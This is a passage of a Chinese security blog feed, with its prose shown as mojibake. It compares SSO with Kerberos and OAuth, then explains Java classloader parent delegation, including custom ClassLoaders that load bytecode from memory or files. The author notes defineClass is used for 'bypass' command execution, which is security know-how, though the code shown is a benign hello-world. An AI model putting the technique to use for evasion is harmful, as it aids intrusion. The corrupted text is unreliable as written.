<h3 id="SSO-vs-Kerberos"><a href="#SSO-vs-Kerberos" class="headerlink" title="SSO vs Kerberos"></a>SSO vs Kerberos</h3><p>ssoå’Œkerberoså’Œå…±åŒç‚¹åœ¨ä»–ä»¬éƒ½ä¸€ä¸ªç”¨TGTæ¢STçš„è¿‡ç¨‹ï¼Œä¸åŒç‚¹åœ¨äºkerberosä¸­å…¶å®æœ‰å››ä¸ªè§’è‰²ï¼ˆclientï¼ŒKDC-ASï¼ŒKDC-TSï¼Œserverï¼‰å¹¶ä¸”å› ä¸ºâ€œç›¸è¿‘â€çš„ä¸¤ä¸ªä¹‹é—´é¢„å…ˆå…±äº«å¯†é’¥ï¼Œæ‰€ä»¥serverä¸éœ€è¦å‘é€è¯·æ±‚å‘KDCæ±‚è¯STçš„çœŸå®æ€§ï¼Œä½†æ˜¯CASä¸­serveréœ€è¦å‘cas serveræ±‚è¯çœŸå®æ€§ã€‚</p>
<h3 id="SSO-vs-OAuth"><a href="#SSO-vs-OAuth" class="headerlink" title="SSO vs OAuth"></a>SSO vs OAuth</h3><p>å®ƒä¿©ä¹‹å‰æœ€å¤§çš„ä¸åŒçš„åœ¨ä¸šåŠ¡åœºæ™¯çš„ä¸åŒï¼ŒSSOç”¨åœ¨ä¸€ä¸ªå…¬å¸å†…éƒ¨å‘˜å·¥çš„å•ç‚¹ç™»é™†ã€‚OAuthç”¨åœ¨ä¸¤ä¸ªå…¬å¸ä¹‹å‰Aå…¬å¸è·å–å…¶ç”¨æˆ·åœ¨Bå…¬å¸çš„ä¸€äº›æ•°æ®ã€‚OAuthè¿˜å¸¸å¸¸æ¶‰åŠåˆ°å•ŠABä¸¤å…¬å¸çš„å¸å·ç»‘å®šï¼Œæ‰€ä»¥éœ€è¦stateæ¥é˜²æ­¢csrfï¼Œè¿™ä¸ªæ˜¯SSOé‡Œé¢æ²¡æœ‰çš„ã€‚</p>
<h2 id="æ‚"><a href="#æ‚" class="headerlink" title="æ‚"></a>æ‚</h2><p>ç¼–è¯‘æ•´ä¸ªcasçš„é‡åˆ°org.samba.jcifs:jcifs-ext:0.9.4æ— æ³•ä¸‹è½½çš„é—®é¢˜ï¼Œé€‰æ‹©æ‰‹åŠ¨ä¸‹è½½jarå¹¶å®‰è£…åˆ°æœ¬åœ°mavenä»“åº“ä¸­ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ä¸‹è½½åœ°å€ï¼šhttp://maven.yonyoucloud.com/nexus/content/groups/public/org/samba/jcifs/jcifs-ext/0.9.4/</span></span><br><span class="line">mvn install:install-file -DgroupId=org.samba.jcifs -DartifactId=jcifs-ext -Dversion=0.9.4 -Dpackaging=jar -Dfile=/Users/cengsiqi/Downloads/jcifs-ext-0.9.4.jar</span><br></pre></td></tr></table></figure>

<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/chenhai201/article/details/50623395">cas 4.1.4å•ç‚¹ç™»å½•å®æˆ˜</a><br><a href="https://blog.51cto.com/fengwan/1876603">CAS 4.1.10å…³é—­HTTPS</a><br><a href="https://blog.csdn.net/GaoXiR/article/details/99539501">ä½¿ç”¨mavenå‘½ä»¤å®‰è£…jaråŒ…åˆ°æœ¬åœ°mavenä»“åº“</a><br><a href="https://blog.csdn.net/mahoking/article/details/42319475">Spring Pæ ‡ç­¾çš„ä½¿ç”¨</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaä¸­åŒäº²å§”æ´¾ç›¸å…³çŸ¥è¯†æ¢³ç†</title>
    <url>/2020/01/22/Java%E4%B8%AD%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/</url>
    <content><![CDATA[<!-- åœ¨ååºåˆ—åŒ–çš„å­¦ä¹ è¿‡ç¨‹ä¸­æ€»æ˜¯ä¸å¯å›é¿ç¢°åˆ°è¿™ä¸ªç‚¹ï¼Œè¿™æ¬¡å°±æ¥ç®€å•çœ‹çœ‹ã€‚ -->
<!-- more -->

<h2 id="classloaderä»‹ç»"><a href="#classloaderä»‹ç»" class="headerlink" title="classloaderä»‹ç»"></a>classloaderä»‹ç»</h2><p>åœ¨javaä¸­æ¯å½“éœ€è¦åŠ è½½ä¸€ä¸ªç±»çš„æ—¶å€™ï¼Œå°±éœ€è¦ç”¨åˆ°ç±»åŠ è½½å™¨ï¼ˆclassloaderï¼‰ï¼Œå®ƒå­˜åœ¨çš„æ„ä¹‰åœ¨äºæŠŠclassæ–‡ä»¶ä¸­å­—èŠ‚ç å˜æˆå¯ä»¥è¢«javaä½¿ç”¨çš„classå¯¹è±¡ã€‚javaä¸­åŸç”Ÿè‡ªå¸¦3ä¸ªclassloaderåˆ†åˆ«æ˜¯Bootstrap ClassLoaderã€Ext ClassLoaderã€App ClassLoaderå¦å¤–ç”¨æˆ·ä¹Ÿå¯ä»¥è‡ªå®šä¹‰Custom ClassLoaderã€‚é‚£å®é™…åŠ è½½ç±»çš„æ—¶å€™æ˜¯ç”¨å“ªä¸€ä¸ªåŠ è½½å™¨ï¼Ÿjavaä¸ºäº†å®‰å…¨ç€æƒ³è§„å®šäº†classloaderä¹‹é—´æœ‰ä¸€å¥—ç­‰çº§æœºåˆ¶ã€‚<strong>å…·ä½“æ¥è¯´å°±æ˜¯ï¼šå½“ä»å­åŠ è½½å™¨å‡ºå‘ï¼Œä½†å­åŠ è½½å™¨åŠ è½½classçš„æ—¶å€™ä¼šå…ˆå§”æ´¾ç»™ç”±çˆ¶åŠ è½½å™¨å…ˆåŠ è½½ï¼Œå¦‚æœçˆ¶åŠ è½½å™¨æ— æ³•åŠ è½½å†ç”±å­åŠ è½½å™¨åŠ è½½ï¼Œè€Œè¿™å¥—å…ˆåé¡ºåºå°±æ˜¯å¹³æ—¶æ‰€è¯´çš„åŒäº²å§”æ´¾</strong>ã€‚</p>
<p><img src="1579506416646-166ccd99-ce6c-45d5-a303-192216a575ed.png#align=left&display=inline&height=503&name=image.png&originHeight=294&originWidth=436&size=49254&status=done&style=none&width=746" alt="image.png"></p>
<ul>
<li><p>BootstrapClassLoaderï¼Œå¯åŠ¨ç±»åŠ è½½å™¨/æ ¹åŠ è½½å™¨ï¼Œè´Ÿè´£åŠ è½½ JVM è¿è¡Œæ—¶æ ¸å¿ƒç±»ï¼Œè¿™äº›ç±»ä½äº JAVA_HOME/lib/rt.jar æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å¸¸ç”¨å†…ç½®åº“ java.<em>.</em> éƒ½åœ¨é‡Œé¢ã€‚è¿™ä¸ª ClassLoader æ¯”è¾ƒç‰¹æ®Šï¼Œå®ƒå…¶å®ä¸æ˜¯ä¸€ä¸ªClassLoaderå®ä¾‹å¯¹è±¡ï¼Œè€Œæ˜¯ç”±Cä»£ç å®ç°ã€‚ç”¨æˆ·åœ¨å®ç°è‡ªå®šä¹‰ç±»åŠ è½½å™¨æ—¶ï¼Œå¦‚æœéœ€è¦æŠŠåŠ è½½è¯·æ±‚å§”æ´¾ç»™å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œé‚£å¯ä»¥ç›´æ¥ä¼ å…¥nullä½œä¸º BootstrapClassLoaderã€‚</p>
</li>
<li><p>ExtClassLoaderï¼Œæ‰©å±•ç±»åŠ è½½å™¨ï¼Œè´Ÿè´£åŠ è½½ JVM æ‰©å±•ç±»ï¼Œæ‰©å±• jar åŒ…ä½äº JAVA_HOME/lib/ext/*.jar ä¸­ï¼Œåº“åé€šå¸¸ä»¥ javax å¼€å¤´ã€‚</p>
</li>
<li><p>AppClassLoaderï¼Œåº”ç”¨ç±»åŠ è½½å™¨/ç³»ç»Ÿç±»åŠ è½½å™¨ï¼Œç›´æ¥æä¾›ç»™ç”¨æˆ·ä½¿ç”¨çš„ClassLoaderï¼Œå®ƒä¼šåŠ è½½ ClASSPATH ç¯å¢ƒå˜é‡æˆ–è€… java.class.path å±æ€§é‡Œå®šä¹‰çš„è·¯å¾„ä¸­çš„ jar åŒ…å’Œç›®å½•ï¼Œè´Ÿè´£åŠ è½½åŒ…æ‹¬å¼€å‘è€…ä»£ç ä¸­ã€ç¬¬ä¸‰æ–¹åº“ä¸­çš„ç±»ã€‚</p>
</li>
</ul>
<p>å®¹æ˜“è¯¯ä¼šçš„ä¸€ç‚¹æ˜¯Classloaderä¹‹é—´å¹¶ä¸æ˜¯ç»§æ‰¿å…³ç³»è€Œæ˜¯ç»„åˆã€‚<br><img src="1579509377078-045bf8a3-1a58-4f33-9d95-e3ef2d06c03a.png#align=left&display=inline&height=308&name=image.png&originHeight=616&originWidth=1518&size=119384&status=done&style=none&width=759" alt="image.png"></p>
<p>AppClassLoaderå’ŒExtClassLoaderéƒ½ç»§æ‰¿è‡ªURLClasLoaderã€‚<br><img src="1579508579303-9a8d00d7-3a6e-435c-8fb4-c1e822b209ff.png#align=left&display=inline&height=233&name=image.png&originHeight=466&originWidth=1892&size=121667&status=done&style=none&width=946" alt="image.png"></p>
<p>URLClassLoaderç»§æ‰¿è‡ªClassLoaderã€‚<br><img src="1579508772615-6b36f925-920f-4dda-8fe9-a06f0d192f4a.png#align=left&display=inline&height=408&name=image.png&originHeight=550&originWidth=1006&size=34288&status=done&style=none&width=746" alt="image.png"></p>
<p>è€Œä¸€èˆ¬è‡ªå®šä¹‰åŠ è½½å™¨æ˜¯ç›´æ¥ç»§æ‰¿ClassLoaderå¹¶æ ¹æ®éœ€æ±‚é‡å†™findClassæˆ–è€…loadClassæ–¹æ³•ï¼ˆä¹‹åä¼šæåˆ°ï¼‰ã€‚<br><img src="1579508811045-b00cfcaf-142a-4b08-8dd2-5d8464940f41.png#align=left&display=inline&height=133&name=image.png&originHeight=266&originWidth=1590&size=46469&status=done&style=none&width=795" alt="image.png"></p>
<p>åœ¨javaä»£ç æˆ‘ä»¬å¯ä»¥è°ƒç”¨getParentçš„æ–¹æ³•è·å–è¯¥åŠ è½½å™¨çš„çˆ¶åŠ è½½å™¨ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ClassLoader appClassloader = ClassLoader.getSystemClassLoader();</span><br><span class="line">        ClassLoader extensionClassloader = appClassloader.getParent();</span><br><span class="line">        System.out.println(<span class="string">"AppClassLoader is "</span> + appClassloader);</span><br><span class="line">        System.out.println(<span class="string">"The parent of AppClassLoader is "</span> + extensionClassloader);</span><br><span class="line">        System.out.println(<span class="string">"The parent of ExtensionClassLoader is "</span> + extensionClassloader.getParent());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//console ouput:</span></span><br><span class="line"><span class="comment">////AppClassLoader is sun.misc.Launcher$AppClassLoader@18b4aac2</span></span><br><span class="line"><span class="comment">////The parent of AppClassLoader is sun.misc.Launcher$ExtClassLoader@61bbe9ba</span></span><br><span class="line"><span class="comment">////The parent of ExtensionClassLoader is null</span></span><br></pre></td></tr></table></figure>

<p><em>ps: å› ä¸ºBootstrapClassLoaderæ˜¯å†…åµŒåˆ°jvmä¸­cä»£ç ï¼Œå¼€å‘è€…æ— æ³•ç›´æ¥è·å–ï¼Œå› æ­¤ExtensionClassLoader.getParent()ä¼šè¿”å›nullã€‚</em><br>_<br>demoä»£ç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, ClassNotFoundException, IllegalAccessException, InstantiationException, InvocationTargetException </span>&#123;</span><br><span class="line">        Test test  = <span class="keyword">new</span> Test();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨new çš„ä½ç½®å¼ºåˆ¶è¿›å…¥ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä»ç¡®å®æ˜¯ä»å­åŠ è½½å™¨AppClassLoaderå¼€å§‹çš„ã€‚<br><img src="1579509643539-5239956c-aae6-4711-9528-d408fdb9fcc5.png#align=left&display=inline&height=287&name=image.png&originHeight=574&originWidth=2848&size=159070&status=done&style=none&width=1424" alt="image.png"></p>
<p>æ­¥å…¥ä¸¤æ­¥ååœ¨ç¬¬ä¸€ä¸ªçº¢æ¡†å¯ä»¥çœ‹åˆ°åŠ è½½åŒäº²å§”æ´¾çš„é€»è¾‘ã€‚<br><img src="1579510144691-d9aa11c7-f072-467e-bf3a-9ae5c9dfd21a.png#align=left&display=inline&height=734&name=image.png&originHeight=1468&originWidth=2200&size=358925&status=done&style=none&width=1100" alt="image.png"></p>
<p>å¦‚æœçˆ¶ç±»æ— æ³•åŠ è½½ï¼Œé‚£ä¹ˆä½¿ç”¨è‡ªå·±çš„findClasså®ç°æ¥æ‰¾ã€‚è¿™é‡ŒTestæ˜¯æˆ‘è‡ªå®šä¹‰çš„å› æ­¤ä¸åœ¨<code>JAVA_HOME/lib/rt.jar</code><br>ä¹Ÿä¸åœ¨ <code>JAVA_HOME/lib/ext/*.jar</code>ä¸­ï¼Œæ‰€ä»¥æœ€åä¼šä½¿ç”¨AppClassLoaderçš„findClasså®ç°ï¼Œè€ŒAppClassLoaderæ²¡æœ‰å®ç°è‡ªå·±çš„findClassï¼Œæ‰€ä»¥æœ€åæ˜¯ç”±URLClassLoader findClasså¯»æ‰¾ç±»ã€‚æœ€åé€šè¿‡deineClassæŠŠå­—èŠ‚ç è½¬æ¢ä¸ºç±»å¯¹è±¡ã€‚<br><img src="1579659421047-d0c30290-aee4-4347-b9e0-66df1d527dca.png#align=left&display=inline&height=501&name=image.png&originHeight=1002&originWidth=2446&size=306425&status=done&style=none&width=1223" alt="image.png"></p>
<h2 id="é‡å†™ClassLoader"><a href="#é‡å†™ClassLoader" class="headerlink" title="é‡å†™ClassLoader"></a>é‡å†™ClassLoader</h2><p>é€šè¿‡ä¸Šé¢åˆ†ææˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨ç¬¬ä¸€æ¬¡åŠ è½½ç±»æ—¶æ˜¯åœ¨loadClassè¿›è¡Œloaderè°ƒåº¦ï¼ˆå®ç°åŒäº²å§”æ´¾é€»è¾‘ï¼‰ï¼Œæœ€åç”±findClassæ‹¿åˆ°è·¯å¾„Resourceï¼Œç”±defineClassåŠ è½½ç±»ã€‚<strong>å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬æŠŠè‡ªå·±çš„classæ”¾åœ¨ä¸å¸¸è§„çš„ä½ç½®ï¼Œå°±éœ€è¦è‡ªå®šä¹‰ClassLoaderï¼Œé‡å†™findClassæ–¹æ³•ã€‚å¦‚æœæˆ‘ä»¬æƒ³çªç ´åŒäº²å§”æ´¾æ¨¡å‹ï¼ˆè¦†ç›–ç³»ç»Ÿç±»ï¼‰å°±éœ€è¦é‡å†™loadClassã€‚</strong></p>
<p>è€Œå®é™…åº”ç”¨ä¸­å¤„äºbypassçš„éœ€è¦æˆ‘ä»¬ç»å¸¸ä½¿ç”¨defineClassä¸€ä¸ªå¤šæ€å®ç°æ¥ä»å†…å­˜ä¸­æˆ–è€…æ–‡ä»¶ä¸­æ‰§è¡Œå‘½ä»¤ã€‚çœ‹ä¸‹é¢ä»£ç ã€‚</p>
<p>ä»å†…å­˜ä¸­</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creator: yz</span></span><br><span class="line"><span class="comment"> * Date: 2019/12/17</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TestHelloWorldç±»å</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String testClassName = <span class="string">"com.anbai.sec.classloader.TestHelloWorld"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TestHelloWorldç±»å­—èŠ‚ç </span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] testClassBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;</span><br><span class="line">            -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">16</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>,</span><br><span class="line">            <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>,</span><br><span class="line">            <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>,</span><br><span class="line">            <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>,</span><br><span class="line">            <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>,</span><br><span class="line">            <span class="number">32</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">126</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">47</span>,</span><br><span class="line">            <span class="number">115</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>,</span><br><span class="line">            <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>,</span><br><span class="line">            <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">2</span>, -<span class="number">80</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">12</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// åªå¤„ç†TestHelloWorldç±»</span></span><br><span class="line">        <span class="keyword">if</span> (name.equals(testClassName)) &#123;</span><br><span class="line">            <span class="comment">// è°ƒç”¨JVMçš„nativeæ–¹æ³•å®šä¹‰TestHelloWorldç±»</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºè‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨</span></span><br><span class="line">        TestClassLoader loader = <span class="keyword">new</span> TestClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// ä½¿ç”¨è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨åŠ è½½TestHelloWorldç±»</span></span><br><span class="line">            Class testClass = loader.loadClass(testClassName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// åå°„åˆ›å»ºTestHelloWorldç±»ï¼Œç­‰ä»·äº TestHelloWorld t = new TestHelloWorld();</span></span><br><span class="line">            Object testInstance = testClass.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// åå°„è·å–helloæ–¹æ³•</span></span><br><span class="line">            Method method = testInstance.getClass().getMethod(<span class="string">"hello"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// åå°„è°ƒç”¨helloæ–¹æ³•,ç­‰ä»·äº String str = t.hello();</span></span><br><span class="line">            String str = (String) method.invoke(testInstance);</span><br><span class="line"></span><br><span class="line">            System.out.println(str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä»æ–‡ä»¶ä¸­</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String classpath;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyClassLoader</span><span class="params">(String classpath)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.classpath = classpath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] classDate = getClassBinaryData(name);</span><br><span class="line">            <span class="comment">//System.out.println(Arrays.toString(classDate));</span></span><br><span class="line">            <span class="keyword">if</span> (classDate == <span class="keyword">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123; <span class="comment">// defineClassæ–¹æ³•å°†å­—èŠ‚ç è½¬åŒ–ä¸ºç±»</span></span><br><span class="line">                <span class="keyword">return</span> defineClass(name, classDate, <span class="number">0</span>, classDate.length);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125; <span class="comment">// è¿”å›ç±»çš„å­—èŠ‚ç </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">byte</span>[] getClassBinaryData(String className) <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        InputStream in = <span class="keyword">null</span>;</span><br><span class="line">        ByteArrayOutputStream out = <span class="keyword">null</span>;</span><br><span class="line">        String path = classpath + File.separatorChar + className.replace(<span class="string">'.'</span>, File.separatorChar) + <span class="string">".class"</span>;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span 